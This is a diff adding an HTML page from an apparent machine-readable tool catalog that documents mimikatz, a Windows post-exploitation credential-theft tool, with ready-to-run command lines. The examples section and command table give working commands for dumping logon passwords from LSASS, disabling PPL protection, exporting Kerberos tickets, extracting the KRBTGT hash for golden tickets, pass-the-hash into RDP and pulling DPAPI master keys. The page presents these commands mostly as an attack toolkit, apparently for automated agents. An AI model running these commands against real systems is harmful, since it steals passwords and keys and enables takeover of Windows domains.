@@ -1,0 +1,113 @@
+<!DOCTYPE html><html lang="en"> <head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><meta name="description" content="Post-exploitation credential extraction tool that recovers plaintext passwords, NTLM hashes, Kerberos tickets, and DPAPI keys from Windows memory and registry hives."><link rel="alternate" type="text/markdown" href="/tools/security-credential-mimikatz.md"><link rel="alternate" type="application/json" href="/api/v1/commands.json"><meta name="tool-namespace" content="security:credential:mimikatz"><title>mimikatz — AutoTest Knowledge Repository</title><link rel="preconnect" href="https://fonts.googleapis.com"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet"><link rel="stylesheet" href="/src/styles/global.css"><link rel="stylesheet" href="/_astro/_id_.CIRgCC12.css"><script type="module" src="/_astro/hoisted.DLmBDdUQ.js"></script></head> <body> <div class="wrapper"> <nav> <a href="/" class="nav-brand">AutoTest</a> <a href="/">Home</a> <a href="/tools">All Tools</a> <a href="/capabilities">Capabilities</a> <a href="/artifacts">Artifacts</a> <a href="/payloads">Payloads</a> <a href="/api/v1/commands.json">API (JSON)</a> <a href="/llms.txt">llms.txt</a> </nav>  <div class="two-col"> <div> <div class="meta-bar"> <span class="tag tag-domain">security</span> <span class="tag">enabled</span> <span class="tag tag-trust">verified</span> <span class="tag tag-risk-critical">critical</span> <span class="tag">v1.0.0</span> </div> <h1 style="font-size: 2.2rem; margin-bottom: 0.5rem;">mimikatz</h1> <p style="font-size: 1.05rem; color: var(--text-secondary); margin-bottom: 1.5rem;"><em>Post-exploitation credential extraction tool that recovers plaintext passwords, NTLM hashes, Kerberos tickets, and DPAPI keys from Windows memory and registry hives.</em></p> <div id="cosmos-bar" class="cosmos-bar" data-astro-cid-slm2pk6o> <button class="cosmos-toggle" onclick="toggleCosmos()" aria-label="Toggle cosmos config" data-astro-cid-slm2pk6o> <span class="cosmos-icon" data-astro-cid-slm2pk6o>&#9881;</span> <span class="cosmos-label" data-astro-cid-slm2pk6o>Cosmos</span> <span class="cosmos-badge" id="cosmos-badge" data-astro-cid-slm2pk6o>10.10.10.10:9001</span> <span class="cosmos-arrow" id="cosmos-arrow" data-astro-cid-slm2pk6o>&#9660;</span> </button> <div class="cosmos-panel" id="cosmos-panel" data-astro-cid-slm2pk6o> <div class="cosmos-fields" id="cosmos-fields" data-astro-cid-slm2pk6o> <!-- populated by cosmos.js --> </div> <div class="cosmos-actions" data-astro-cid-slm2pk6o> <button class="cosmos-btn" onclick="Cosmos.reset()" data-astro-cid-slm2pk6o>Reset to defaults</button> </div> </div> </div> <script>(function(){const defaultExpandedStr = "false";
+
+  const EXPANDED_KEY = "cosmos-expanded";
+  const defaultExpanded = defaultExpandedStr;
+
+  window.toggleCosmos = function () {
+    const bar = document.getElementById("cosmos-bar");
+    const panel = document.getElementById("cosmos-panel");
+    const arrow = document.getElementById("cosmos-arrow");
+    const isExpanded = bar.classList.toggle("expanded");
+    panel.style.display = isExpanded ? "block" : "none";
+    arrow.innerHTML = isExpanded ? "&#9660;" : "&#9660;";
+    try { localStorage.setItem(EXPANDED_KEY, isExpanded ? "1" : "0"); } catch (_) {}
+  };
+
+  (function initCosmosBar() {
+    const panel = document.getElementById("cosmos-panel");
+    const fields = document.getElementById("cosmos-fields");
+    const badge = document.getElementById("cosmos-badge");
+    const bar = document.getElementById("cosmos-bar");
+
+    try {
+      const saved = localStorage.getItem(EXPANDED_KEY);
+      if (saved === "1" || (saved === null && defaultExpanded === "true")) {
+        bar.classList.add("expanded");
+        if (panel) panel.style.display = "block";
+      }
+    } catch (_) {}
+
+    function render() {
+      if (!window.Cosmos) { setTimeout(render, 10); return; }
+      var config = window.Cosmos.getConfig();
+      if (!fields) return;
+      fields.innerHTML = config.map(function (c) {
+        var val = window.Cosmos.get(c.key);
+        var esc = function (s) { return String(s).replace(/&/g,"&amp;").replace(/</g,"&lt;").replace(/>/g,"&gt;").replace(/"/g,"&quot;"); };
+        return '<div class="cosmos-field">' +
+          '<label for="cosmos-' + esc(c.key) + '">' + esc(c.label) + '</label>' +
+          '<input id="cosmos-' + esc(c.key) + '" type="' + (c.type === "number" ? "number" : "text") + '" ' +
+            'value="' + esc(val) + '" ' +
+            'placeholder="' + esc(c.placeholder || "") + '" ' +
+            'data-cosmos-key="' + esc(c.key) + '" ' +
+            'oninput="onCosmosInput(this)" />' +
+          '</div>';
+      }).join("");
+      updateBadge();
+    }
+
+    window.onCosmosInput = function (el) {
+      var key = el.getAttribute("data-cosmos-key");
+      if (window.Cosmos) window.Cosmos.set(key, el.value);
+    };
+
+    function updateBadge() {
+      if (!badge) return;
+      var ip = window.Cosmos ? window.Cosmos.get("ip") || "?" : "?";
+      var port = window.Cosmos ? window.Cosmos.get("port") || "?" : "?";
+      badge.textContent = ip + ":" + port;
+    }
+
+    if (window.Cosmos) {
+      window.Cosmos.onChange(function () { updateBadge(); });
+    }
+    render();
+  })();
+})();</script>  <div class="cmd-preview cosmos-preview" data-preview="{&#34;template&#34;:&#34;mimikatz \&#34;{command}\&#34; exit&#34;,&#34;globalVars&#34;:{},&#34;paramNames&#34;:[&#34;command&#34;]}" data-astro-cid-wofrsxkc> <div class="cmd-preview-header" data-astro-cid-wofrsxkc> <span class="cmd-preview-label" data-astro-cid-wofrsxkc>&#128203; Live Preview</span> <button class="cmd-preview-copy" onclick="copyPreviewCommand(this)" title="Copy command" data-astro-cid-wofrsxkc>&#128203; Copy</button> </div> <pre class="cmd-preview-output" id="cmd-preview-output" data-astro-cid-wofrsxkc><code data-astro-cid-wofrsxkc>mimikatz &quot;{command}&quot; exit</code></pre> <div class="cmd-preview-params" id="cmd-preview-params" data-astro-cid-wofrsxkc> <span class="cmd-placeholder" data-ph="command" data-astro-cid-wofrsxkc> <code class="ph-tag ph-local" data-astro-cid-wofrsxkc> 📎 command </code> </span> </div> </div>   <div style="margin-bottom: 1.5rem;"> <pre><code>mimikatz &quot;{command}&quot; exit</code></pre> <p style="font-size: 0.85rem; color: var(--text-muted); margin-top: 0.3rem;">
+Sandbox: execFile &middot; Timeout: 60s
+ </p> </div> </div> <aside class="sidebar-info"> <div class="cvss-widget" data-astro-cid-qmhzttxy> <div class="cvss-score" style="--score-color: #f87171;" data-astro-cid-qmhzttxy> <span class="cvss-value" data-astro-cid-qmhzttxy>9.5</span> <span class="cvss-label" data-astro-cid-qmhzttxy>Critical</span> </div> <div class="cvss-bar-track" data-astro-cid-qmhzttxy> <div class="cvss-bar-fill" style="width: 95%; background: #f87171;" data-astro-cid-qmhzttxy></div> </div> <div class="cvss-scale" data-astro-cid-qmhzttxy> <span data-astro-cid-qmhzttxy>0.0</span> <span style="color: var(--green);" data-astro-cid-qmhzttxy>Low</span> <span style="color: var(--amber);" data-astro-cid-qmhzttxy>Med</span> <span style="color: #fb923c;" data-astro-cid-qmhzttxy>High</span> <span style="color: var(--red);" data-astro-cid-qmhzttxy>10.0</span> </div>  </div>  <div style="font-weight:600;margin-bottom:0.75rem;font-size:0.9rem;color:var(--text-muted);text-transform:uppercase;letter-spacing:0.05em;">Info</div> <div class="info-row"><span class="info-label">ID</span><span class="info-value"><code>security-credential-mimikatz</code></span></div> <div class="info-row"><span class="info-label">Namespace</span><span class="info-value" style="font-size:0.8rem;"><code>security:credential:mimikatz</code></span></div> <div class="info-row"><span class="info-label">Version</span><span class="info-value">1.0.0</span></div> <div class="info-row"><span class="info-label">Risk</span><span class="info-value tag-risk-critical">critical</span></div> <div class="info-row"><span class="info-label">Trust</span><span class="info-value">verified</span></div> <div class="info-row"><span class="info-label">Policy</span><span class="info-value">enabled</span></div> <div class="info-row"><span class="info-label">Platforms</span><span class="info-value" style="font-size:0.8rem;">windows</span></div> <div class="info-row"><span class="info-label">Arch</span><span class="info-value" style="font-size:0.8rem;">amd64</span></div> <div class="info-row"><span class="info-label">Allowed Tools</span><span class="info-value" style="font-size:0.8rem;">mimikatz</span></div> <div class="info-row" style="flex-direction:column;gap:0.25rem;padding:0.6rem 0;"> <span class="info-label">Integrity</span> <span class="info-value" style="font-size:0.65rem;font-family:var(--font-mono);word-break:break-all;line-height:1.4;">sha256:f2b7bfd9d8bfe859ee3a5667a7f7f11ad6a3a61c80d2d2c1d3359272053f75a9</span> </div>   <div class="info-row"><span class="info-label">Attack Types</span><span class="info-value" style="font-size:0.8rem;">CredentialAccess, PrivilegeEscalation</span></div> <div class="info-row"><span class="info-label">Techniques</span><span class="info-value" style="font-size:0.8rem;">credential-access, privilege-escalation</span></div>  </aside> </div> <div class="section"> <h2>Capabilities</h2> <div class="card-grid cols-2" style="margin-bottom:0;"> <div class="card" style="padding:0.75rem 1rem;animation:none;"> <code>security.credential.dump.lsass</code> </div><div class="card" style="padding:0.75rem 1rem;animation:none;"> <code>security.credential.wdigest</code> </div><div class="card" style="padding:0.75rem 1rem;animation:none;"> <code>security.credential.ntlm</code> </div><div class="card" style="padding:0.75rem 1rem;animation:none;"> <code>security.credential.kerberostickets</code> </div><div class="card" style="padding:0.75rem 1rem;animation:none;"> <code>security.credential.dpapi</code> </div><div class="card" style="padding:0.75rem 1rem;animation:none;"> <code>security.credential.masterkeys</code> </div><div class="card" style="padding:0.75rem 1rem;animation:none;"> <code>security.pth</code> </div><div class="card" style="padding:0.75rem 1rem;animation:none;"> <code>security.ptt</code> </div> </div> </div><div class="section"> <h2>Parameters</h2> <div class="table-wrap"> <table> <thead> <tr> <th>Name</th> <th>Type</th> <th>Required</th> <th>Default</th> <th>Description</th> <th>Aliases</th> </tr> </thead> <tbody> <tr> <td><code>command</code></td> <td>string</td> <td>Yes</td> <td>-</td> <td>Mimikatz command (e.g., sekurlsa::logonpasswords)</td> <td>-</td> </tr> </tbody> </table> </div> </div><div class="section"> <h2>Contract</h2> <div style="display:grid;grid-template-columns:1fr 1fr;gap:1rem;"> <div> <p style="font-size:0.85rem;color:var(--text-muted);margin-bottom:0.5rem;text-transform:uppercase;letter-spacing:0.05em;">Inputs</p> <div class="card" style="padding:0.65rem 0.85rem;margin-bottom:0.5rem;animation:none;"> <code>windows.process.dump</code> <p style="font-size:0.8rem;color:var(--text-muted);margin-top:0.2rem;">LSASS process dump file</p> </div> </div> <div> <p style="font-size:0.85rem;color:var(--text-muted);margin-bottom:0.5rem;text-transform:uppercase;letter-spacing:0.05em;">Outputs</p> <div class="card" style="padding:0.65rem 0.85rem;margin-bottom:0.5rem;animation:none;"> <code>security.credential.dump</code> <p style="font-size:0.8rem;color:var(--text-muted);margin-top:0.2rem;">Extracted plaintext passwords, hashes, and tickets</p> </div> </div> </div> <div class="card" style="margin-top:0.75rem;animation:none;"> <span style="font-size:0.85rem;color:var(--text-muted);">Side effects: </span> <code style="font-size:0.8rem;">process_spawnfilesystem_write</code> </div> </div><div class="section"> <h2>Workflow Edges</h2> <div style="display:grid;grid-template-columns:1fr 1fr;gap:1rem;"> <div> <p style="font-size:0.85rem;color:var(--text-muted);margin-bottom:0.5rem;text-transform:uppercase;letter-spacing:0.05em;">Produces</p> <span class="tag" style="margin:0.15rem;">security.credential.dump</span> </div> <div> <p style="font-size:0.85rem;color:var(--text-muted);margin-bottom:0.5rem;text-transform:uppercase;letter-spacing:0.05em;">Consumes</p> <span class="tag" style="margin:0.15rem;">windows.process.dump</span> </div> </div> </div><div class="section"> <h2>Resource Profile</h2> <div class="table-wrap" style="max-width:400px;"> <table> <thead><tr><th>Resource</th><th>Value</th></tr></thead> <tbody> <tr><td>CPU</td><td>medium</td></tr> <tr><td>Memory</td><td>256 MB</td></tr> <tr><td>Network</td><td>low</td></tr> <tr><td>Disk I/O</td><td>low</td></tr> </tbody> </table> </div> </div><div class="section"> <h2>Examples</h2> <div class="example"> <p><strong>One-liner dump all logon passwords</strong></p> <pre><code>mimikatz &quot;privilege::debug&quot; &quot;sekurlsa::logonpasswords&quot; exit</code></pre> </div><div class="example"> <p><strong>Load mimikatz in memory via PowerShell</strong></p> <pre><code>Invoke-Mimikatz -DumpCreds</code></pre> </div><div class="example"> <p><strong>Disable PPL (Protected Process Light) before dumping</strong></p> <pre><code>mimikatz &quot;!+&quot; &quot;privilege::debug&quot; &quot;sekurlsa::logonpasswords&quot; exit</code></pre> </div><div class="example"> <p><strong>Extract credentials from a LSASS dump file</strong></p> <pre><code>mimikatz &quot;sekurlsa::minidump lsass.dmp&quot; &quot;sekurlsa::logonpasswords&quot; exit</code></pre> </div><div class="example"> <p><strong>Extract credentials from volume shadow copy</strong></p> <pre><code>mimikatz &quot;lsadump::sam /server:$(hostname)&quot; exit</code></pre> </div><div class="example"> <p><strong>Extract Kerberos tickets</strong></p> <pre><code>mimikatz &quot;privilege::debug&quot; &quot;sekurlsa::tickets /export&quot; exit</code></pre> </div><div class="example"> <p><strong>Extract domain SID and KRBTGT hash for golden ticket</strong></p> <pre><code>mimikatz &quot;privilege::debug&quot; &quot;lsadump::lsa /inject /id:502&quot; exit</code></pre> </div><div class="example"> <p><strong>Pass-the-hash to RDP session</strong></p> <pre><code>mimikatz &quot;privilege::debug&quot; &quot;sekurlsa::pth /user:admin /domain:evilcorp /ntlm:&lt;HASH&gt; /run:mstsc.exe /restrictedadmin&quot;</code></pre> </div><div class="example"> <p><strong>DPAPI master key extraction</strong></p> <pre><code>mimikatz &quot;privilege::debug&quot; &quot;sekurlsa::dpapi&quot; exit</code></pre> </div> </div><div class="section"> <h2>Documentation</h2> <div class="body-content"><h1>mimikatz — Windows Credential Extraction</h1>
+<p>mimikatz is the standard tool for extracting credentials from Windows systems. It operates by reading LSASS process memory, SAM/SECURITY registry hives, and DPAPI master keys.</p>
+<h2>Common Commands</h2>
+<table>
+<thead>
+<tr>
+<th>Command</th>
+<th>Purpose</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>privilege::debug</code></td>
+<td>Enable SeDebugPrivilege (required)</td>
+</tr>
+<tr>
+<td><code>sekurlsa::logonpasswords</code></td>
+<td>Dump plaintext passwords and NTLM hashes</td>
+</tr>
+<tr>
+<td><code>sekurlsa::tickets /export</code></td>
+<td>Export Kerberos tickets</td>
+</tr>
+<tr>
+<td><code>lsadump::lsa /inject</code></td>
+<td>Dump LSA secrets (KRBTGT hash)</td>
+</tr>
+<tr>
+<td><code>lsadump::sam</code></td>
+<td>Dump SAM hashes</td>
+</tr>
+<tr>
+<td><code>sekurlsa::pth</code></td>
+<td>Pass-the-hash</td>
+</tr>
+<tr>
+<td><code>dpapi::masterkey</code></td>
+<td>Extract DPAPI master keys</td>
+</tr>
+</tbody></table>
+<h2>Requirements</h2>
+<ul>
+<li><strong>Administrator privileges</strong> on the target</li>
+<li><strong>SeDebugPrivilege</strong>: Usually held by Administrators</li>
+<li><strong>PPL bypass</strong>: Some systems require PPL evasion (e.g., <code>mimikatz !+</code>)</li>
+</ul>
+</div> </div><div class="section"> <h2>Related Tools</h2> <span class="tag" style="margin:0.15rem;">netexec</span><span class="tag" style="margin:0.15rem;">impacket</span> </div><div class="section"> <h2>References</h2> <ul> <li><a href="https://github.com/gentilkiwi/mimikatz" target="_blank">mimikatz GitHub</a></li> </ul> </div> <footer> <p>AutoTest Knowledge Repository — Dual-Purpose Human / Machine Reference</p> <p>90 tools · 7 domains · 274 capabilities · 87 workflow edges · 135 payloads</p> </footer> </div>  </body> </html>
